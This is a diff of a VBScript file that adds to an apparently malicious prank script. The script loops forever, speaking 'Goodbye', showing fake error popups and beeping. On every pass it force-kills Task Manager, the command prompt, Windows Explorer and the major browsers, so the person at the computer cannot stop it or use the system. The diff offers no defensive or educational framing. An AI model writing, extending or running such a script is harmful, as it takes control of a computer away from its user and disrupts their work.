@@ -1,6 +1,6 @@
 Option Explicit
 
-Dim objFSO, objFolder, objFile, objShell
+Dim objFSO, objFolder, objFile, objShell, i
 
 ' Create a FileSystemObject
 Set objFSO = CreateObject("Scripting.FileSystemObject")
@@ -21,28 +21,31 @@ Set objFSO = Nothing
 ' Create a Shell object
 Set objShell = CreateObject("WScript.Shell")
 
-' Say "Goodbye"
-objShell.Run "PowerShell -Command ""Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Goodbye')""", 0, True
-
-' Run an infinite loop
+' Say "Goodbye" and display a message box with alternating icons
+i = 1
 Do While True
-    ' Play a beep sound
-    objShell.Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True
+    ' Say "Goodbye" using text-to-speech synthesis
+    objShell.Run "PowerShell -Command ""Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Goodbye')""", 0, True
 
-    ' Terminate Task Manager
+    ' Display a message box with the word "Goodbye" and alternating icons
+    If i Mod 2 = 1 Then
+        objShell.Popup "Goodbye", 0, "Error", &H10
+    Else
+        objShell.Popup "Goodbye", 0, "Information", &H0
+    End If
+    i = i + 1
+
+    ' Terminate various processes on the computer
     objShell.Run "taskkill /f /im taskmgr.exe", 0, True
-
-    ' Terminate Command Prompt
     objShell.Run "taskkill /f /im cmd.exe", 0, True
-
-    ' Terminate File Explorer
     objShell.Run "taskkill /f /im explorer.exe", 0, True
-
-    ' Terminate common browsers
     objShell.Run "taskkill /f /im chrome.exe", 0, True
     objShell.Run "taskkill /f /im firefox.exe", 0, True
     objShell.Run "taskkill /f /im iexplore.exe", 0, True
 
+    ' Play a beep sound
+    objShell.Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True
+
     ' Wait for one second before repeating the loop
-    WScript.Sleep 10
+    WScript.Sleep 1000
 Loop
